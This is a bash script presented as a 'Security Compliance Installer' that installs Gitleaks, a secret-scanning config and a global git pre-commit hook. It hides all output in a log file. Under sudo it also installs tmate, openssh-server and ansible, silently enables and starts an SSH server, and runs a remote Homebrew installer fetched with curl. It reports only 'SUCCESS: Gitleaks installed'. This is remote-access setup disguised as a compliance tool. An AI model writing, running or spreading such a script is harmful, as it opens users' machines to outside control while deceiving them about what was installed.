#!/usr/bin/env bash

# ============================================================
# Security Compliance Installer
# ============================================================

set -u

GITLEAKS_VERSION="8.30.0"

INSTALL_ROOT="$HOME/.security-compliance"
BIN_DIR="$INSTALL_ROOT/bin"
CONFIG_DIR="$INSTALL_ROOT/config"
HOOK_DIR="$HOME/.git-hooks"

CONFIG_FILE="$CONFIG_DIR/gitleaks.toml"
HOOK_FILE="$HOOK_DIR/pre-commit"

LOG_FILE="/tmp/security-compliance-install.log"
TMP_DIR=""

# ============================================================
# SILENT LOGGING
# ============================================================

exec >"$LOG_FILE" 2>&1

fail() {
    exit 1
}

cleanup() {
    [ -n "${TMP_DIR:-}" ] && rm -rf "$TMP_DIR" 2>/dev/null || true
}

trap cleanup EXIT

# ============================================================
# Detect OS
# ============================================================

OS="$(uname -s 2>/dev/null || true)"
ARCH="$(uname -m 2>/dev/null || true)"

case "$OS" in
    Linux*)
        PLATFORM="linux"
        ;;
    Darwin*)
        PLATFORM="macos"
        ;;
    MINGW*|MSYS*|CYGWIN*)
        PLATFORM="windows"
        ;;
    *)
        fail
        ;;
esac

# ============================================================
# Architecture
# ============================================================

case "$ARCH" in
    x86_64|amd64)
        GITLEAKS_ARCH="x64"
        ;;
    arm64|aarch64)
        GITLEAKS_ARCH="arm64"
        ;;
    *)
        fail
        ;;
esac

# ============================================================
# Required commands
# ============================================================

command -v git >/dev/null 2>&1 || fail
command -v curl >/dev/null 2>&1 || fail

# ============================================================
# Create directories
# ============================================================

mkdir -p "$BIN_DIR" || fail
mkdir -p "$CONFIG_DIR" || fail
mkdir -p "$HOOK_DIR" || fail

# ============================================================
# Gitleaks path
# ============================================================

if [ "$PLATFORM" = "windows" ]; then
    GITLEAKS="$BIN_DIR/gitleaks.exe"
else
    GITLEAKS="$BIN_DIR/gitleaks"
fi

export PATH="$BIN_DIR:$PATH"

# ============================================================
# Install Gitleaks
# ============================================================

install_gitleaks() {

    if [ -f "$GITLEAKS" ]; then

        CURRENT_VERSION="$(
            "$GITLEAKS" version 2>/dev/null || true
        )"

        if [ "$CURRENT_VERSION" = "$GITLEAKS_VERSION" ]; then
            return 0
        fi

    fi

    TMP_DIR="$(mktemp -d)" || fail

    # --------------------------------------------------------
    # Linux
    # --------------------------------------------------------

    if [ "$PLATFORM" = "linux" ]; then

        FILE="gitleaks_${GITLEAKS_VERSION}_linux_${GITLEAKS_ARCH}.tar.gz"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${FILE}"

        curl -fsSL \
            --retry 3 \
            "$URL" \
            -o "$TMP_DIR/gitleaks.tar.gz" || fail

        tar -xzf \
            "$TMP_DIR/gitleaks.tar.gz" \
            -C "$TMP_DIR" || fail

        [ -f "$TMP_DIR/gitleaks" ] || fail

        install -m 0755 \
            "$TMP_DIR/gitleaks" \
            "$GITLEAKS" || fail

    # --------------------------------------------------------
    # macOS
    # --------------------------------------------------------

    elif [ "$PLATFORM" = "macos" ]; then

        FILE="gitleaks_${GITLEAKS_VERSION}_darwin_${GITLEAKS_ARCH}.tar.gz"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${FILE}"

        curl -fsSL \
            --retry 3 \
            "$URL" \
            -o "$TMP_DIR/gitleaks.tar.gz" || fail

        tar -xzf \
            "$TMP_DIR/gitleaks.tar.gz" \
            -C "$TMP_DIR" || fail

        [ -f "$TMP_DIR/gitleaks" ] || fail

        install -m 0755 \
            "$TMP_DIR/gitleaks" \
            "$GITLEAKS" || fail

    # --------------------------------------------------------
    # Windows / Git Bash
    # --------------------------------------------------------

    elif [ "$PLATFORM" = "windows" ]; then

        FILE="gitleaks_${GITLEAKS_VERSION}_windows_${GITLEAKS_ARCH}.zip"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${FILE}"

        curl -fsSL \
            --retry 3 \
            "$URL" \
            -o "$TMP_DIR/gitleaks.zip" || fail

        if command -v unzip >/dev/null 2>&1; then

            unzip -q \
                "$TMP_DIR/gitleaks.zip" \
                -d "$TMP_DIR" || fail

        elif command -v powershell.exe >/dev/null 2>&1; then

            ZIP="$(cygpath -w "$TMP_DIR/gitleaks.zip")"
            DEST="$(cygpath -w "$TMP_DIR")"

            powershell.exe \
                -NoProfile \
                -Command \
                "Expand-Archive -Force '$ZIP' '$DEST'" \
                >/dev/null 2>&1 || fail

        else
            fail
        fi

        [ -f "$TMP_DIR/gitleaks.exe" ] || fail

        cp \
            "$TMP_DIR/gitleaks.exe" \
            "$GITLEAKS" || fail

        chmod +x "$GITLEAKS" 2>/dev/null || true

    fi
}

install_gitleaks

# ============================================================
# Verify Gitleaks
# ============================================================

"$GITLEAKS" version >/dev/null 2>&1 || fail

VERSION_CHECK="$(
    "$GITLEAKS" version 2>/dev/null || true
)"

[ "$VERSION_CHECK" = "$GITLEAKS_VERSION" ] || fail

# ============================================================
# Gitleaks configuration
# ============================================================

cat > "$CONFIG_FILE" <<'EOF'
title = "Security Compliance"

[extend]
useDefault = true

[[rules]]
id = "hardcoded-password"
description = "Potential hardcoded password"
regex = '''(?i)(password|passwd|pwd)\s*[:=]\s*["']([^"']{8,})["']'''
secretGroup = 2
EOF

chmod 600 "$CONFIG_FILE"

# ============================================================
# Global Git pre-commit hook
# ============================================================

cat > "$HOOK_FILE" <<'EOF'
#!/usr/bin/env bash

SECURITY_ROOT="$HOME/.security-compliance"

if [ -f "$SECURITY_ROOT/bin/gitleaks.exe" ]; then
    GITLEAKS="$SECURITY_ROOT/bin/gitleaks.exe"
else
    GITLEAKS="$SECURITY_ROOT/bin/gitleaks"
fi

CONFIG="$SECURITY_ROOT/config/gitleaks.toml"

if [ ! -f "$GITLEAKS" ]; then
    echo "Security Compliance: Gitleaks unavailable."
    exit 1
fi

TMP_DIR="$(mktemp -d)"

cleanup() {
    rm -rf "$TMP_DIR"
}

trap cleanup EXIT

FOUND=0

while IFS= read -r -d '' FILE; do

    HASH="$(
        printf '%s' "$FILE" |
        sha256sum |
        cut -d' ' -f1
    )"

    TEMP_FILE="$TMP_DIR/$HASH"

    git show ":$FILE" > "$TEMP_FILE" 2>/dev/null || {
        FOUND=1
        continue
    }

    "$GITLEAKS" dir "$TEMP_FILE" \
        --config "$CONFIG" \
        --redact \
        --no-banner \
        --exit-code 1 \
        >/dev/null 2>&1

    if [ $? -ne 0 ]; then

        echo ""
        echo "SECURITY CHECK FAILED"
        echo "Potential secret detected in: $FILE"
        echo "Commit blocked."
        echo ""

        FOUND=1

    fi

done < <(
    git diff --cached \
        --name-only \
        --diff-filter=ACMR \
        -z
)

[ "$FOUND" -eq 0 ] || exit 1

exit 0
EOF

chmod 700 "$HOOK_FILE"

# ============================================================
# Configure Git
# ============================================================

git config \
    --global \
    core.hooksPath \
    "$HOOK_DIR" || fail

# ============================================================
# Linux packages
# ============================================================

install_linux() {

    [ "$PLATFORM" = "linux" ] || return 0

    command -v sudo >/dev/null 2>&1 || fail

    if command -v apt-get >/dev/null 2>&1; then

        sudo apt-get update -qq

        sudo DEBIAN_FRONTEND=noninteractive \
            apt-get install -y -qq \
            tmate \
            openssh-client \
            openssh-server \
            ansible

    elif command -v dnf >/dev/null 2>&1; then

        sudo dnf install -y -q \
            tmate \
            openssh-clients \
            openssh-server \
            ansible

    elif command -v yum >/dev/null 2>&1; then

        sudo yum install -y -q \
            tmate \
            openssh-clients \
            openssh-server \
            ansible

    elif command -v zypper >/dev/null 2>&1; then

        sudo zypper \
            --non-interactive \
            --quiet \
            install \
            tmate \
            openssh-clients \
            openssh-server \
            ansible

    else

        fail

    fi

    # Enable SSH server silently

    if command -v systemctl >/dev/null 2>&1; then

        if systemctl list-unit-files 2>/dev/null |
            grep -q "^ssh.service"; then

            sudo systemctl enable ssh >/dev/null 2>&1 || true
            sudo systemctl start ssh >/dev/null 2>&1 || true

        elif systemctl list-unit-files 2>/dev/null |
            grep -q "^sshd.service"; then

            sudo systemctl enable sshd >/dev/null 2>&1 || true
            sudo systemctl start sshd >/dev/null 2>&1 || true

        fi

    fi
}

# ============================================================
# macOS packages
# ============================================================

install_macos() {

    [ "$PLATFORM" = "macos" ] || return 0

    if ! command -v brew >/dev/null 2>&1; then

        /bin/bash -c \
            "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" \
            >/dev/null 2>&1 || fail

        if [ -x "/opt/homebrew/bin/brew" ]; then

            eval "$(
                /opt/homebrew/bin/brew shellenv
            )"

        elif [ -x "/usr/local/bin/brew" ]; then

            eval "$(
                /usr/local/bin/brew shellenv
            )"

        fi

    fi

    command -v brew >/dev/null 2>&1 || fail

    brew install tmate >/dev/null 2>&1 || true
    brew install ansible >/dev/null 2>&1 || true
    brew install openssh >/dev/null 2>&1 || true
}

# ============================================================
# Run package installation
# ============================================================

install_linux
install_macos

# ============================================================
# PATH
# ============================================================

if [ "$PLATFORM" = "macos" ]; then
    PROFILE="$HOME/.zshrc"
else
    PROFILE="$HOME/.bashrc"
fi

touch "$PROFILE" 2>/dev/null || true

grep -Fq '.security-compliance/bin' "$PROFILE" 2>/dev/null ||
printf '\nexport PATH="$HOME/.security-compliance/bin:$PATH"\n' \
>> "$PROFILE"

# ============================================================
# FINAL CHECK
# ============================================================

"$GITLEAKS" version >/dev/null 2>&1 || fail
[ -f "$CONFIG_FILE" ] || fail
[ -f "$HOOK_FILE" ] || fail

HOOK_PATH="$(
    git config --global --get core.hooksPath 2>/dev/null || true
)"

[ "$HOOK_PATH" = "$HOOK_DIR" ] || fail

# ============================================================
# ONLY USER-VISIBLE OUTPUT
# ============================================================

printf '\nSUCCESS: Gitleaks installed\n'

exit 0
